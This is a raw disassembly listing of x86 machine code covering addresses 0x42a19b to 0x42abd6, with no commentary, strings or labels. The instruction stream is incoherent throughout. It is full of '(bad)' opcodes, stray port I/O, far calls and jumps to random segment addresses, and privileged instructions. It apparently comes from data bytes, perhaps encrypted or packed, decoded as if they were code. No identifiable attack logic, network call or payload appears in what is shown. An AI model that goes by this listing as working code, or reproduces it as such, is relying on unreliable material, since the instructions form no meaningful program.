  42a19b:	in     al,0xe6
  42a19d:	or     dl,BYTE PTR [esi]
  42a19f:	sti    
  42a1a0:	mov    esp,ebx
  42a1a2:	dec    edx
  42a1a3:	idiv   DWORD PTR [esi-0x1bc4b6d6]
  42a1a9:	aas    
  42a1aa:	and    al,0x89
  42a1ac:	jns    0x42a194
  42a1ae:	push   ebp
  42a1af:	scas   al,BYTE PTR es:[edi]
  42a1b0:	xor    eax,0xc7225c5d
  42a1b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a1b6:	push   0x410a19da
  42a1bb:	and    DWORD PTR [ebx],0xffffffda
  42a1be:	dec    ebp
  42a1bf:	repnz push cs
  42a1c1:	push   ss
  42a1c2:	add    BYTE PTR [ebx+esi*8],0xec
  42a1c6:	adc    dh,BYTE PTR [edx+0x2fe00d41]
  42a1cc:	call   0x43c0:0x34a75c5e
  42a1d3:	dec    ecx
  42a1d4:	daa    
  42a1d5:	repnz (bad) 
  42a1d7:	in     al,0xef
  42a1d9:	mov    ds:0xea4d643c,eax
  42a1de:	sub    al,0x9a
  42a1e0:	in     al,dx
  42a1e1:	add    bl,cl
  42a1e3:	scas   eax,DWORD PTR es:[edi]
  42a1e4:	call   0x5d06:0xb98858b7
  42a1eb:	mov    esp,eax
  42a1ed:	fld    QWORD PTR [edx+0x2b9d32bc]
  42a1f3:	inc    edx
  42a1f4:	xor    esi,DWORD PTR ds:0x5adc445f
  42a1fa:	scas   eax,DWORD PTR es:[edi]
  42a1fb:	retf   0xa885
  42a1fe:	mov    esp,0x156f1540
  42a203:	jmp    0xea21:0xebb9699d
  42a20a:	into   
  42a20b:	mov    bl,0x33
  42a20d:	inc    ecx
  42a20e:	addr16 int3 
  42a210:	dec    esi
  42a211:	pop    ecx
  42a212:	out    dx,eax
  42a213:	imul   ebx
  42a215:	iret   
  42a216:	in     al,0x64
  42a218:	stos   BYTE PTR es:[edi],al
  42a219:	cmp    eax,0x26b11301
  42a21e:	push   esp
  42a21f:	int3   
  42a220:	adc    BYTE PTR [ecx],al
  42a222:	mov    DWORD PTR [ebx],edx
  42a224:	call   0x3639dec8
  42a229:	ins    DWORD PTR es:[edi],dx
  42a22a:	xor    eax,DWORD PTR ds:0x75f4d6c
  42a230:	jnp    0x42a277
  42a232:	jecxz  0x42a1e3
  42a234:	aam    0x8b
  42a236:	cld    
  42a237:	add    BYTE PTR [esp+ecx*2+0x370d0147],dl
  42a23e:	retf   
  42a23f:	dec    ebx
  42a240:	push   0xffffff95
  42a242:	mov    eax,ds:0x613aa8ca
  42a247:	test   DWORD PTR [ecx-0x49033814],edx
  42a24d:	adc    edi,esp
  42a24f:	ss (bad) 
  42a251:	push   esi
  42a252:	jbe    0x42a2c2
  42a254:	pop    esp
  42a255:	adc    bh,BYTE PTR ds:0x32fd231e
  42a25b:	sahf   
  42a25c:	ud2    
  42a25e:	dec    ecx
  42a25f:	test   DWORD PTR [ecx+0x68],0xac18d1e4
  42a266:	sahf   
  42a267:	dec    edi
  42a268:	jns    0x42a1fa
  42a26a:	dec    ebp
  42a26b:	lock xrelease add BYTE PTR [eax],al
	...
  42a2d3:	add    BYTE PTR [eax],al
  42a2d5:	add    BYTE PTR [ebx],ch
  42a2d7:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a2dd:	mov    bh,0x1a
  42a2df:	aas    
  42a2e0:	scas   al,BYTE PTR es:[edi]
  42a2e1:	fld    DWORD PTR [ecx+0x7a721057]
  42a2e7:	ret    
  42a2e8:	add    DWORD PTR [eax],eax
  42a2ea:	inc    DWORD PTR [eax]
  42a2ec:	add    BYTE PTR [eax],al
  42a2ee:	add    al,0xb3
  42a2f0:	aaa    
  42a2f1:	inc    ecx
  42a2f2:	mov    dl,0xdd
  42a2f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a2f5:	pusha  
  42a2f6:	mov    eax,0xe55e10a6
  42a2fb:	jp     0x42a33b
  42a2fd:	xor    BYTE PTR [eax*2-0x5564a644],ch
  42a304:	ins    BYTE PTR es:[edi],dx
  42a305:	xchg   ecx,eax
  42a306:	adc    al,0xc8
  42a308:	test   eax,0x2d257430
  42a30d:	(bad)  
  42a30e:	fwait
  42a30f:	jbe    0x42a2cd
  42a311:	pop    ds
  42a312:	xor    ch,dl
  42a314:	out    0x8e,eax
  42a316:	div    DWORD PTR [edi+0x459577ca]
  42a31c:	push   eax
  42a31d:	sub    ebp,DWORD PTR [eax]
  42a31f:	add    al,0xa1
  42a321:	fld    DWORD PTR [eax]
  42a323:	sub    esp,DWORD PTR [edx-0x1ce56fb5]
  42a329:	mov    ecx,0x1377c593
  42a32e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a32f:	retf   
  42a330:	scas   al,BYTE PTR es:[edi]
  42a331:	ds icebp 
  42a333:	or     DWORD PTR [ebp+ecx*4-0xd],0xffffff90
  42a338:	push   0x4e9f92b4
  42a33d:	or     DWORD PTR [esi+esi*1],0xffffffd8
  42a341:	loop   0x42a2d0
  42a343:	das    
  42a344:	cmp    dh,BYTE PTR [esi+0x3c]
  42a347:	and    bl,BYTE PTR [esi+0x14]
  42a34a:	cmp    cl,ch
  42a34c:	daa    
  42a34d:	xor    al,0xa7
  42a34f:	jmp    0xc4af0e5b
  42a354:	or     DWORD PTR [edx+0x6a],0xfcfb1a0b
  42a35b:	sar    BYTE PTR [esi-0x57],1
  42a35e:	pop    es
  42a35f:	lock sahf 
  42a361:	inc    eax
  42a362:	imul   edx,ecx,0x3
  42a365:	push   esi
  42a366:	add    eax,0x623f1042
  42a36b:	into   
  42a36c:	es popf 
  42a36e:	and    edi,DWORD PTR [ebx+edi*2-0x3d]
  42a372:	cmp    al,0xe0
  42a374:	hlt    
  42a375:	out    dx,al
  42a376:	sub    cl,BYTE PTR [ebx-0x45]
  42a379:	inc    edi
  42a37a:	stos   BYTE PTR es:[edi],al
  42a37b:	dec    ecx
  42a37c:	les    esp,FWORD PTR [ecx+0x4e408d8c]
  42a382:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a383:	inc    ecx
  42a384:	shr    ah,1
  42a386:	(bad)  
  42a387:	mov    edi,0x1b9d316a
  42a38c:	mov    ch,0x6f
  42a38e:	lea    esi,[edx-0x61]
  42a391:	xchg   ecx,eax
  42a392:	jmp    0x62fc07d7
  42a397:	dec    esp
  42a398:	mov    esi,0xa56bb294
  42a39d:	int    0xad
  42a39f:	sub    BYTE PTR [eax],cl
  42a3a1:	push   ss
  42a3a2:	xchg   BYTE PTR [edx-0x282cb276],ch
  42a3a8:	pop    ecx
  42a3a9:	mov    ebx,0x74b6deac
  42a3ae:	je     0x42a416
  42a3b0:	mov    esi,0x88f2cdf7
  42a3b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a3b6:	dec    DWORD PTR [ecx-0x1]
  42a3b9:	int3   
  42a3ba:	jo     0x42a360
  42a3bc:	or     al,0x23
  42a3be:	mov    edx,0xf333f833
  42a3c3:	or     cl,ah
  42a3c5:	add    dh,dh
  42a3c7:	mov    WORD PTR [edx+0x797ea8b6],cs
  42a3cd:	imul   ebp,DWORD PTR ds:0x8df947d8,0x16
  42a3d4:	or     ebp,ecx
  42a3d6:	in     eax,0x84
  42a3d8:	cs stos BYTE PTR es:[edi],al
  42a3da:	jb     0x42a44a
  42a3dc:	lahf   
  42a3dd:	imul   ebp,DWORD PTR [ecx-0x3e],0xffffff9f
  42a3e1:	mov    al,BYTE PTR [ebx-0x4]
  42a3e4:	jg     0x42a41f
  42a3e6:	aas    
  42a3e7:	or     BYTE PTR [esp+ebp*8+0xdebaf],ah
	...
  42a456:	jg     0x42a466
  42a458:	jne    0x42a495
  42a45a:	jne    0x42a4d7
  42a45c:	jg     0x42a4ac
  42a45e:	loop   0x42a4c9
  42a460:	mov    ebp,0x8c549a3d
  42a465:	mov    al,ds:0x1c479
  42a46a:	inc    DWORD PTR [eax]
  42a46c:	add    BYTE PTR [eax],al
  42a46e:	cmp    al,0x41
  42a470:	or     BYTE PTR [ecx],ah
  42a472:	push   cs
  42a473:	inc    eax
  42a474:	shl    DWORD PTR [ebx+0x5ed461eb],0x12
  42a47b:	push   edi
  42a47c:	cld    
  42a47d:	xchg   ebx,eax
  42a47e:	popf   
  42a47f:	mov    edx,0x1e097d7b
  42a484:	adc    edx,esp
  42a486:	jo     0x42a460
  42a488:	jle    0x42a4e8
  42a48a:	add    dl,al
  42a48c:	mov    al,0xfc
  42a48e:	push   es
  42a48f:	ss push esi
  42a491:	std    
  42a492:	jge    0x42a429
  42a494:	add    eax,0x40a0c588
  42a499:	push   esi
  42a49a:	xchg   esi,eax
  42a49b:	shl    DWORD PTR [edi+0x5b],0xdb
  42a49f:	lahf   
  42a4a0:	mov    dh,0x10
  42a4a2:	fdiv   DWORD PTR [eax]
  42a4a4:	pop    ss
  42a4a5:	add    bh,ch
  42a4a7:	int3   
  42a4a8:	inc    esi
  42a4a9:	aas    
  42a4aa:	aad    0xaf
  42a4ac:	jb     0x42a51f
  42a4ae:	sbb    al,0x6f
  42a4b0:	push   esp
  42a4b1:	xchg   esi,eax
  42a4b2:	xlat   BYTE PTR ds:[ebx]
  42a4b3:	xchg   BYTE PTR [edx-0x1f488f55],ah
  42a4b9:	repz scas eax,DWORD PTR es:[edi]
  42a4bb:	sbb    bh,dh
  42a4bd:	aam    0x1
  42a4bf:	aaa    
  42a4c0:	jns    0x42a4a6
  42a4c2:	push   ecx
  42a4c3:	ins    DWORD PTR es:[edi],dx
  42a4c4:	icebp  
  42a4c5:	and    esi,DWORD PTR [esi-0x792fae10]
  42a4cb:	mov    ah,0x85
  42a4cd:	xlat   BYTE PTR ss:[ebx]
  42a4cf:	push   edx
  42a4d0:	mov    ch,0x18
  42a4d2:	test   al,0x99
  42a4d4:	xchg   edi,eax
  42a4d5:	iret   
  42a4d6:	out    0xbb,al
  42a4d8:	repz data16 out dx,al
  42a4db:	cmp    dl,BYTE PTR [bx+di]
  42a4de:	rcl    DWORD PTR [ebx-0x6],1
  42a4e1:	lods   al,BYTE PTR ds:[esi]
  42a4e2:	jecxz  0x42a469
  42a4e4:	stc    
  42a4e5:	leave  
  42a4e6:	addr16 jne 0x42a4fa
  42a4e9:	les    ebp,FWORD PTR [ebp+ecx*1-0x57]
  42a4ed:	push   ds
  42a4ee:	dec    ecx
  42a4ef:	add    al,0x8b
  42a4f1:	push   edx
  42a4f2:	call   0xa186:0xfd66d570
  42a4f9:	push   es
  42a4fa:	xor    bh,BYTE PTR [eax-0x320cd93a]
  42a500:	and    eax,0xbafa7180
  42a505:	cld    
  42a506:	mov    ebp,0x5e48221
  42a50b:	pop    ebx
  42a50c:	mov    al,ds:0x3230e0a5
  42a511:	mov    dl,ch
  42a513:	cmp    al,0x87
  42a515:	sbb    al,0xd4
  42a517:	enter  0xf7bb,0xc9
  42a51b:	sbb    al,0x8f
  42a51d:	mov    esp,0x24c55832
  42a522:	push   ecx
  42a523:	fild   WORD PTR [esp+ebp*8]
  42a526:	dec    ebx
  42a527:	cli    
  42a528:	(bad)  
  42a529:	mov    ah,0x6e
  42a52b:	mov    bh,0x6b
  42a52d:	ja     0x42a573
  42a52f:	dec    ebp
  42a530:	daa    
  42a531:	les    ebx,FWORD PTR [ecx-0x72516907]
  42a537:	mov    edi,0xfd7448c5
  42a53c:	mov    BYTE PTR [edi],bl
  42a53e:	fmul   st,st(5)
  42a540:	cmp    BYTE PTR [ecx+0x25b46637],ah
  42a546:	add    al,0xbf
  42a548:	xor    BYTE PTR [edi+eiz*4],dh
  42a54b:	pushf  
  42a54c:	mov    ds,WORD PTR [eax+0x40]
  42a54f:	les    ebx,FWORD PTR [ebx+0x5848ad87]
  42a555:	mov    ds:0xcf9af867,eax
  42a55a:	xchg   ecx,eax
  42a55b:	jb     0x42a5b0
  42a55d:	outs   dx,DWORD PTR ds:[esi]
  42a55e:	xor    cl,BYTE PTR ds:0xba681490
  42a564:	cmp    BYTE PTR [eax+0x60b1f288],al
  42a56a:	ins    DWORD PTR es:[edi],dx
  42a56b:	loope  0x42a5a5
	...
  42a5d5:	add    BYTE PTR [eax],bl
  42a5d7:	dec    edi
  42a5d8:	pop    ss
  42a5d9:	mov    ecx,0xefbef957
  42a5de:	(bad)  
  42a5df:	cmc    
  42a5e0:	mov    edx,0x5dce439f
  42a5e5:	retf   0xc578
  42a5e8:	add    DWORD PTR [eax],eax
  42a5ea:	inc    DWORD PTR [eax]
  42a5ec:	add    BYTE PTR [eax],al
  42a5ee:	adc    DWORD PTR [ebp-0x83e76f4],ebx
  42a5f4:	xchg   BYTE PTR [edx+0x42],ch
  42a5f7:	mov    ebp,0xc3466a0a
  42a5fc:	nop
  42a5fd:	inc    edx
  42a5fe:	fsubr  DWORD PTR [edx+0x6188ec12]
  42a604:	jmp    0x5f7f:0xe8778b99
  42a60b:	ss jns 0x42a59e
  42a60e:	dec    eax
  42a60f:	clc    
  42a610:	add    al,0xce
  42a612:	push   esp
  42a613:	xor    eax,0xc248ba99
  42a618:	pushf  
  42a619:	dec    esi
  42a61a:	aam    0x95
  42a61c:	and    al,0x26
  42a61e:	sbb    al,0xa1
  42a620:	push   ds
  42a621:	pop    edi
  42a622:	mov    cl,0x25
  42a624:	cmp    eax,0x6d0bfcd2
  42a629:	out    0x61,al
  42a62b:	aaa    
  42a62c:	xchg   edi,eax
  42a62d:	div    edi
  42a62f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a630:	adc    esi,ebp
  42a632:	xor    al,0x85
  42a634:	push   ebp
  42a635:	inc    edx
  42a636:	pop    eax
  42a637:	call   0xfb0b72c8
  42a63c:	adc    ch,BYTE PTR [ebx+0x6985bacd]
  42a642:	pmuludq mm7,QWORD PTR [ecx+edi*8-0x61]
  42a647:	popa   
  42a648:	repnz jmp 0x2706:0x5bcc7de0
  42a650:	in     eax,0x82
  42a652:	imul   ebx,DWORD PTR [ebx-0x5f],0x0
  42a656:	outs   dx,DWORD PTR ds:[esi]
  42a657:	sbb    eax,0xd9ded634
  42a65c:	inc    esi
  42a65d:	xchg   esi,eax
  42a65e:	add    al,0xc1
  42a660:	pop    ebp
  42a661:	cmp    eax,0x8f834f7a
  42a666:	mov    cl,0x99
  42a668:	mov    ecx,0xeeaaf2f8
  42a66d:	test   eax,0x86131d36
  42a672:	dec    esp
  42a673:	sbb    eax,0xc9816e57
  42a678:	(bad)  
  42a679:	xlat   BYTE PTR ds:[ebx]
  42a67a:	mov    eax,ds:0x6319b825
  42a67f:	cld    
  42a680:	sar    BYTE PTR [eax-0x2071a357],1
  42a686:	mov    ds:0xa6097ef3,al
  42a68b:	retf   0x417b
  42a68e:	sahf   
  42a68f:	jg     0x42a629
  42a691:	jbe    0x42a70d
  42a693:	and    BYTE PTR [edi],0xc8
  42a696:	retf   0x18f6
  42a699:	(bad)  
  42a69c:	les    ecx,FWORD PTR [ecx+0x48]
  42a69f:	pusha  
  42a6a0:	mov    edi,0xc8648061
  42a6a5:	mov    edx,0xfcef7186
  42a6aa:	inc    ebp
  42a6ab:	imul   ecx,edx,0x36
  42a6ae:	add    BYTE PTR [ebx],dh
  42a6b0:	push   cs
  42a6b1:	test   eax,0x92b3929a
  42a6b6:	popf   
  42a6b7:	hlt    
  42a6b8:	adc    ebx,DWORD PTR [esi]
  42a6ba:	mov    ds,WORD PTR [esi+0x3f]
  42a6bd:	add    BYTE PTR [eax],ch
  42a6bf:	call   0x7c17:0x126f7100
  42a6c6:	retf   0x2c0f
  42a6c9:	loop   0x42a67e
  42a6cb:	xor    esi,DWORD PTR ds:0x5d43304e
  42a6d1:	fdivr  DWORD PTR [edi+edi*8-0x7]
  42a6d5:	pusha  
  42a6d6:	fwait
  42a6d7:	iret   
  42a6d8:	pop    esp
  42a6d9:	xchg   esi,eax
  42a6da:	inc    ebp
  42a6db:	fmul   DWORD PTR [esi-0x1e9beaaf]
  42a6e1:	jno    0x42a6e6
  42a6e3:	mov    BYTE PTR [ecx],ah
  42a6e5:	cmp    DWORD PTR [edx+0x7d],esi
  42a6e8:	push   esi
  42a6e9:	shr    BYTE PTR ds:0x20f1,0x0
	...
  42a754:	add    BYTE PTR [eax],al
  42a756:	and    al,0x16
  42a758:	outs   dx,BYTE PTR ds:[esi]
  42a759:	(bad)  
  42a75a:	jle    0x42a75b
  42a75c:	lods   eax,DWORD PTR ds:[esi]
  42a75d:	test   DWORD PTR [edi+0xcb8131c],0x773f976b
  42a767:	mov    BYTE PTR [ecx],0x0
  42a76a:	inc    DWORD PTR [eax]
  42a76c:	add    BYTE PTR [eax],al
  42a76e:	inc    edx
  42a76f:	xchg   ebp,eax
  42a770:	dec    ecx
  42a771:	jae    0x42a768
  42a773:	and    ch,dl
  42a775:	fwait
  42a776:	pop    ss
  42a777:	push   cs
  42a778:	pop    edx
  42a779:	out    0x85,al
  42a77b:	mov    bl,0x89
  42a77d:	or     dh,BYTE PTR [edx+0x56]
  42a780:	jnp    0x42a7ac
  42a782:	push   DWORD PTR [edi]
  42a784:	adc    al,0xcf
  42a786:	jp     0x42a7b1
  42a788:	inc    edx
  42a789:	add    DWORD PTR [esi+0x275419cc],eax
  42a78f:	inc    eax
  42a790:	xlat   BYTE PTR ds:[ebx]
  42a791:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a792:	adc    edi,esp
  42a794:	inc    ebx
  42a795:	push   edi
  42a796:	gs push 0xdc4563
  42a79c:	inc    esp
  42a79d:	jle    0x42a725
  42a79f:	xor    al,0x28
  42a7a1:	sub    dl,BYTE PTR [eax]
  42a7a3:	hlt    
  42a7a4:	(bad)  
  42a7a5:	int3   
  42a7a6:	sbb    ah,BYTE PTR [edx+0x19a622d2]
  42a7ac:	adc    eax,0xffee135a
  42a7b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7b2:	jecxz  0x42a76c
  42a7b4:	and    esp,DWORD PTR [edi+edi*4]
  42a7b7:	push   esi
  42a7b8:	mov    al,0xf5
  42a7ba:	xchg   ecx,eax
  42a7bb:	aad    0x14
  42a7bd:	cmp    dl,BYTE PTR [esi-0x4b]
  42a7c0:	push   cs
  42a7c1:	sbb    bh,ch
  42a7c3:	sbb    eax,0x47b9fe0a
  42a7c8:	add    ax,0xb867
  42a7cc:	iret   
  42a7cd:	dec    ecx
  42a7ce:	xchg   edx,eax
  42a7cf:	cmp    eax,eax
  42a7d1:	sar    DWORD PTR [ebp-0x14fbb4b7],0x2b
  42a7d8:	aad    0xc3
  42a7da:	(bad)  [edi+0x48fbf13f]
  42a7e0:	push   0x56
  42a7e2:	in     al,0xf1
  42a7e4:	dec    esp
  42a7e5:	imul   edx,DWORD PTR [edx-0x323f5776],0x41
  42a7ec:	xlat   BYTE PTR ds:[ebx]
  42a7ed:	or     BYTE PTR [ebx+0x7a5ff08],al
  42a7f3:	sub    al,BYTE PTR [edx+esi*8-0x1395c2bf]
  42a7fa:	xor    esi,DWORD PTR fs:[eax+0x23e48a32]
  42a801:	loope  0x42a7ea
  42a803:	push   eax
  42a804:	inc    eax
  42a805:	in     eax,dx
  42a806:	inc    edx
  42a807:	cmp    esp,ecx
  42a809:	mov    edi,0x2b8e808f
  42a80e:	dec    edx
  42a80f:	pop    ecx
  42a810:	dec    BYTE PTR [esi+0x6fbdcad7]
  42a816:	jecxz  0x42a7f2
  42a818:	xchg   edi,eax
  42a819:	push   ss
  42a81a:	(bad)  
  42a81b:	xor    al,0x94
  42a81d:	sub    edx,0x6bd9f8da
  42a823:	rcl    DWORD PTR [ebx+0x6c651375],0xcf
  42a82a:	ret    
  42a82b:	push   ecx
  42a82c:	xor    al,0xa7
  42a82e:	stos   DWORD PTR es:[di],eax
  42a830:	or     BYTE PTR [eax+0x79d7e2d4],ch
  42a836:	lahf   
  42a837:	and    eax,0x1646f6ab
  42a83c:	mov    ebp,0x2eeaba29
  42a841:	sub    bh,BYTE PTR [edi-0x1dc5f95c]
  42a847:	dec    DWORD PTR ds:0x6ccf73d3
  42a84d:	xchg   esp,eax
  42a84e:	loopne 0x42a85e
  42a850:	inc    esp
  42a851:	ja     0x42a857
  42a853:	rol    BYTE PTR [eax],0x5a
  42a856:	cmp    DWORD PTR [ecx+0x779f3cfd],esi
  42a85c:	out    0x87,al
  42a85e:	mov    BYTE PTR [ebp-0x2ff37df8],dh
  42a864:	fcomp  QWORD PTR [eax]
  42a866:	mov    dh,0xd6
  42a868:	mov    bh,0xe6
  42a86a:	sar    DWORD PTR [edx+0x20],1
	...
  42a8d5:	add    BYTE PTR [edx-0x10409c9b],cl
  42a8db:	mov    edi,0xc58175de
  42a8e0:	xchg   edi,eax
  42a8e1:	ins    BYTE PTR es:[edi],dx
  42a8e2:	sbb    dl,BYTE PTR [esi-0x3]
  42a8e5:	sub    eax,0x1c776
  42a8ea:	inc    DWORD PTR [eax]
  42a8ec:	add    BYTE PTR [eax],al
  42a8ee:	jle    0x42a875
  42a8f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a8f1:	and    cl,BYTE PTR [esi-0x11479bf5]
  42a8f7:	out    0x7f,al
  42a8f9:	mov    dl,BYTE PTR [eax+0x56]
  42a8fc:	clc    
  42a8fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a8fe:	fidiv  DWORD PTR [edi-0x15]
  42a901:	pushf  
  42a902:	ds and eax,0x506a09f3
  42a908:	and    eax,0x643e447f
  42a90d:	sbb    al,0x46
  42a90f:	cmp    al,0x17
  42a911:	adc    DWORD PTR [ecx+esi*8],eax
  42a914:	ja     0x42a8b6
  42a916:	popf   
  42a917:	mov    ebp,0x1e7cfadd
  42a91c:	jne    0x42a961
  42a91e:	lds    ebp,FWORD PTR [eax-0x4d2b4a8d]
  42a924:	shl    BYTE PTR [edx],0xbb
  42a927:	ins    BYTE PTR es:[edi],dx
  42a928:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a929:	inc    ebx
  42a92a:	xchg   ebx,eax
  42a92b:	pushf  
  42a92c:	std    
  42a92d:	hlt    
  42a92e:	inc    ecx
  42a92f:	push   edi
  42a930:	lds    esp,FWORD PTR [edi-0x5]
  42a933:	dec    esi
  42a934:	push   esp
  42a935:	adc    eax,0x2398f1fa
  42a93a:	ret    0xfd02
  42a93d:	retf   
  42a93e:	lods   al,BYTE PTR ds:[esi]
  42a93f:	add    BYTE PTR [ebx-0x282b558],bl
  42a945:	inc    ecx
  42a946:	xchg   esp,eax
  42a947:	(bad)  
  42a949:	cmp    bl,ah
  42a94b:	out    dx,al
  42a94c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a94d:	or     al,0x24
  42a94f:	fs jne 0x42a9b5
  42a952:	call   0xd89e:0xe1c3704
  42a959:	cwde   
  42a95a:	dec    esi
  42a95b:	js     0x42a901
  42a95d:	pop    edi
  42a95e:	sbb    al,0x87
  42a960:	mov    eax,ds:0x237b10ce
  42a965:	pop    edi
  42a966:	mov    dh,0xcd
  42a968:	sbb    DWORD PTR [ebp-0x30],ebp
  42a96b:	(bad)  [esi+ebx*8-0x22]
  42a96f:	call   0xaea1:0x85dd340d
  42a976:	mov    bh,0x99
  42a978:	ja     0x42a903
  42a97a:	in     al,0x2a
  42a97c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a97d:	(bad)  
  42a97e:	sbb    edi,DWORD PTR [eax]
  42a980:	mov    cl,0x6e
  42a982:	push   ebp
  42a983:	call   0x595526ab
  42a988:	cs xchg ebx,eax
  42a98a:	pop    esi
  42a98b:	stos   DWORD PTR es:[edi],eax
  42a98c:	cmp    BYTE PTR [ebx-0x70339fb5],dh
  42a992:	push   ebx
  42a993:	cmp    DWORD PTR [esi+esi*2],ebx
  42a996:	xchg   ebp,eax
  42a997:	add    bh,BYTE PTR [ebx+0x1a32fe7c]
  42a99d:	dec    eax
  42a99e:	add    ch,BYTE PTR [edi+0x5627618f]
  42a9a4:	ret    0x3b8a
  42a9a7:	sbb    eax,0xfd48ee30
  42a9ac:	int    0x68
  42a9ae:	setb   BYTE PTR ds:0x7e4ca596
  42a9b5:	pop    ss
  42a9b6:	push   esi
  42a9b7:	mov    ds:0x8a1a4caf,al
  42a9bc:	mov    eax,ds:0xe2b13379
  42a9c1:	inc    edi
  42a9c2:	sbb    DWORD PTR [edi],0x590071cc
  42a9c8:	push   0x7d
  42a9ca:	loope  0x42a9d4
  42a9cc:	cli    
  42a9cd:	cld    
  42a9ce:	sub    eax,DWORD PTR [ebx+ebp*8]
  42a9d1:	dec    ebx
  42a9d2:	(bad)  
  42a9d3:	call   0x4cf22c55
  42a9d8:	in     al,0x5b
  42a9da:	mov    cl,0xd3
  42a9dc:	fs fs retf 
  42a9df:	fldcw  WORD PTR [edx]
  42a9e1:	lods   al,BYTE PTR ds:[esi]
  42a9e2:	sub    DWORD PTR [ebx+0x679f5ad7],0xffffff9b
  42a9e9:	ror    esp,1
  42a9eb:	jb     0x42a9ec
	...
  42aa55:	add    BYTE PTR [eax+0x3fee1d93],ch
  42aa5b:	out    dx,al
  42aa5c:	sti    
  42aa5d:	xlat   BYTE PTR ds:[ebx]
  42aa5e:	in     eax,0xd3
  42aa60:	aad    0x7
  42aa62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aa63:	dec    ebp
  42aa64:	pop    ss
  42aa65:	jmp    0x4472df
  42aa6a:	inc    DWORD PTR [eax]
  42aa6c:	add    BYTE PTR [eax],al
  42aa6e:	mov    edi,0xb210e930
  42aa73:	mov    dh,BYTE PTR [ecx+0x2d]
  42aa76:	test   BYTE PTR [esi-0x5e],al
  42aa79:	mov    WORD PTR [edx-0x4b],fs
  42aa7c:	loopne 0x42aa30
  42aa7e:	call   0x55b2:0xca39e56c
  42aa85:	or     BYTE PTR [edx+0x5e],bh
  42aa88:	mov    edi,ss
  42aa8a:	push   ebx
  42aa8b:	adc    DWORD PTR [eax+0x3fa46621],0xc1989eaa
  42aa95:	mov    bl,0xb3
  42aa97:	jmp    0x42aa34
  42aa99:	pop    ecx
  42aa9a:	mov    ah,0xf4
  42aa9c:	outs   dx,DWORD PTR ds:[esi]
  42aa9d:	xchg   DWORD PTR [ebp+0x39],ebp
  42aaa0:	xchg   ebx,eax
  42aaa1:	sahf   
  42aaa2:	pushf  
  42aaa3:	inc    edx
  42aaa4:	fcom   st(7)
  42aaa6:	ins    BYTE PTR es:[edi],dx
  42aaa7:	cmp    eax,0x933b7dc9
  42aaac:	das    
  42aaad:	xor    DWORD PTR [edx+0x6d],ebp
  42aab0:	xchg   esp,eax
  42aab1:	ins    BYTE PTR es:[edi],dx
  42aab2:	or     eax,0xb41533ad
  42aab7:	push   eax
  42aab8:	xchg   DWORD PTR [ecx],esi
  42aaba:	(bad)  
  42aabb:	push   eax
  42aabc:	shr    cl,1
  42aabe:	div    DWORD PTR [ecx+0x6dd475ac]
  42aac4:	mov    BYTE PTR [esi+0x19905517],0xd6
  42aacb:	ret    
  42aacc:	mov    cl,0xcf
  42aace:	arpl   WORD PTR [ebx],bp
  42aad0:	add    ebp,DWORD PTR [esi]
  42aad2:	xlat   BYTE PTR ds:[ebx]
  42aad3:	jbe    0x42ab4f
  42aad5:	add    ecx,eax
  42aad7:	inc    ecx
  42aad8:	test   BYTE PTR ds:0x5aa18879,al
  42aade:	fistp  WORD PTR [edi]
  42aae0:	sbb    dl,bh
  42aae2:	push   eax
  42aae3:	inc    edx
  42aae4:	mov    BYTE PTR [edi-0x12765cfd],dh
  42aaea:	pop    eax
  42aaeb:	hlt    
  42aaec:	xor    ch,BYTE PTR [ebp-0xced3a19]
  42aaf2:	mov    ss,WORD PTR [esp+esi*1-0x77715d22]
  42aaf9:	icebp  
  42aafa:	xchg   ebp,eax
  42aafb:	lods   eax,DWORD PTR ds:[esi]
  42aafc:	loop   0x42ab09
  42aafe:	push   ebp
  42aaff:	fucomip st,st(5)
  42ab01:	add    esi,DWORD PTR [edi-0x11]
  42ab04:	jmp    FWORD PTR [esi]
  42ab06:	push   ss
  42ab07:	inc    ebx
  42ab08:	arpl   WORD PTR [eax+edx*4],sp
  42ab0b:	push   ebp
  42ab0c:	inc    edx
  42ab0d:	and    edi,edi
  42ab0f:	imul   ebx,DWORD PTR [edx-0x71],0x951ce536
  42ab16:	or     BYTE PTR [esi],ah
  42ab18:	outs   dx,BYTE PTR ds:[esi]
  42ab19:	lods   al,BYTE PTR ds:[esi]
  42ab1a:	test   eax,0xda0d2541
  42ab1f:	inc    esi
  42ab20:	xor    BYTE PTR [edx+ebp*8+0x79c40f43],cl
  42ab27:	fstp   QWORD PTR [edx+ecx*1-0x1a]
  42ab2b:	xor    ebp,esi
  42ab2d:	popa   
  42ab2e:	scas   al,BYTE PTR es:[edi]
  42ab2f:	lds    esp,FWORD PTR [edi+0x37]
  42ab32:	mov    ah,0x60
  42ab34:	jmp    0x42aac0
  42ab36:	stc    
  42ab37:	shl    DWORD PTR [edx-0x72d3f360],cl
  42ab3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ab3e:	pop    edx
  42ab3f:	sti    
  42ab40:	neg    BYTE PTR [eax+esi*4-0x404c70b6]
  42ab47:	repz mov al,ds:0x5f2e94ef
  42ab4d:	jg     0x42ab9b
  42ab4f:	and    al,0x91
  42ab51:	(bad)  
  42ab52:	mov    ds:0x5cc718c5,al
  42ab57:	leave  
  42ab58:	jmp    0xc571390f
  42ab5d:	dec    esi
  42ab5e:	(bad)  [edx]
  42ab60:	loopne 0x42abc2
  42ab62:	mov    dl,0xb1
  42ab64:	push   0xffffffa7
  42ab66:	dec    ebx
  42ab67:	dec    edx
  42ab68:	rcr    DWORD PTR [edx+0x109f66],cl
	...
  42abd6:	ds push cs
